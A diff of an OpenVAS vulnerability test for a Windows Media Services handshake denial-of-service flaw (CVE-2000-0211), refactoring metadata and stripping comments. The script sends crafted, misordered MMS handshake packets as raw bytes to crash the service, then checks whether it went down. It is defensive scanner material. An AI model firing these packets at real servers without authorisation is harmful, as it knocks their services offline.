@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_ms_win_media_service_handshake_seq_dos_vuln.nasl 7549 2017-10-24 12:10:14Z cfischer $
+# $Id: gb_ms_win_media_service_handshake_seq_dos_vuln.nasl 11141 2018-08-28 10:01:13Z asteins $
 #
 # Microsoft Windows Media Service Handshake Sequence DoS Vulnerability
 #
@@ -27,12 +27,12 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.802888");
-  script_version("$Revision: 7549 $");
+  script_version("$Revision: 11141 $");
   script_cve_id("CVE-2000-0211");
   script_bugtraq_id(1000);
   script_tag(name:"cvss_base", value:"5.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2017-10-24 14:10:14 +0200 (Tue, 24 Oct 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-08-28 12:01:13 +0200 (Tue, 28 Aug 2018) $");
   script_tag(name:"creation_date", value:"2012-07-30 13:22:23 +0530 (Mon, 30 Jul 2012)");
   script_name("Microsoft Windows Media Service Handshake Sequence DoS Vulnerability");
   script_category(ACT_DENIAL);
@@ -48,33 +48,23 @@ if(description)
   script_xref(name:"URL", value:"http://support.microsoft.com/default.aspx?scid=kb;[LN];253943");
   script_xref(name:"URL", value:"http://technet.microsoft.com/en-us/security/bulletin/ms00-013");
 
-  tag_impact = "Successful exploitation could allow remote attackers to cause denial of
+  script_tag(name:"impact", value:"Successful exploitation could allow remote attackers to cause denial of
   service conditions.
 
-  Impact Level: Application";
-
-  tag_affected = "Microsoft Windows 2000
+  Impact Level: Application");
+  script_tag(name:"affected", value:"Microsoft Windows 2000
   Microsoft Windows NT 4.0
-  Windows Media Services 4.0 and 4.1";
-
-  tag_insight = "The handshake sequence between a Windows Media server and a Windows Media
+  Windows Media Services 4.0 and 4.1");
+  script_tag(name:"insight", value:"The handshake sequence between a Windows Media server and a Windows Media
   Player occurs in a particular order. If a series of client handshake packets
   are sent in a particular misordered sequence, with certain timing
   constraints, the server attempts to use a resource before it has been
-  initialized causing the Windows Media Unicast Service to crash.";
-
-  tag_solution = "Run Windows Update and update the listed hotfixes or download and
+  initialized causing the Windows Media Unicast Service to crash.");
+  script_tag(name:"solution", value:"Run Windows Update and update the listed hotfixes or download and
   update mentioned hotfixes in the advisory from the below link,
-  http://technet.microsoft.com/en-us/security/bulletin/ms00-013";
-
-  tag_summary = "This host is running Microsoft Windows Media Service and is prone
-  to denial of service vulnerability.";
-
-  script_tag(name:"impact", value:tag_impact);
-  script_tag(name:"affected", value:tag_affected);
-  script_tag(name:"insight", value:tag_insight);
-  script_tag(name:"solution", value:tag_solution);
-  script_tag(name:"summary", value:tag_summary);
+  http://technet.microsoft.com/en-us/security/bulletin/ms00-013");
+  script_tag(name:"summary", value:"This host is running Microsoft Windows Media Service and is prone
+  to denial of service vulnerability.");
 
   script_tag(name:"solution_type", value:"VendorFix");
   script_tag(name:"qod_type", value:"remote_vul");
@@ -84,33 +74,18 @@ if(description)
 
 include("host_details.inc");
 
-## Variable Initialization
-soc1 = 0;
-soc2 = 0;
-mss_req1 = "";
-mss_req2 = "";
-mss_req3 = "";
-mss_req4 = "";
-mss_req5 = "";
-mss_req6 = "";
-mss_req7 = "";
-mss_res = "";
-
 ## Media Service Port
 port = 1755;
 
-## Check Port State
 if(!get_port_state(port)){
   exit(0);
 }
 
-## Open the socket
 soc1 = open_sock_tcp(port);
 if(!soc1){
   exit(0);
 }
 
-## Construct Microsoft Media Service connection request
 mss_req1 = raw_string(0x01, 0x00, 0x00, 0x00, 0xce, 0xfa, 0x0b, 0xb0,           ## Command Signature
                       0xa0, 0x00, 0x00, 0x00,                                   ## Command Length
                       0x4d, 0x4d, 0x53, 0x20,                                   ## Protocol Type : MMS (Microsoft Media Server)
@@ -141,7 +116,6 @@ mss_req1 = raw_string(0x01, 0x00, 0x00, 0x00, 0xce, 0xfa, 0x0b, 0xb0,           
 send(socket:soc1 , data: mss_req1);
 mms_res = recv(socket:soc1, length:512);
 
-## Confirm if its Microsoft Media service
 if(!mms_res || "MMS" >!< mms_res)
 {
   close(soc1);
@@ -149,7 +123,6 @@ if(!mms_res || "MMS" >!< mms_res)
 }
 
 ## Microsoft Media Service Transer Request to Server
-## Construct Misordered Handshake Sequences
 mss_req2 = raw_string(0x01, 0x00, 0x00, 0x00, 0xce, 0xfa, 0x0b, 0xb0, 0x20,
                       0x00, 0x00, 0x00, 0x4d, 0x4d, 0x53, 0x20, 0x04, 0x00,
                       0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x5e, 0xba, 0x49,
@@ -232,7 +205,6 @@ close(soc1);
 
 soc2 = open_sock_tcp(port);
 
-## Confirm Windows Media Unicast Service crashed
 ## If couldn't open soc then mms is crashed
 if(!soc2)
 {
@@ -242,7 +214,6 @@ if(!soc2)
 else
 {
   ## Send the Connect request again
-  ## Confirm it doesnot responds
   send(socket:soc2 , data: mss_req1);
   mms_res = recv(socket:soc2, length:512);
   close(soc2);
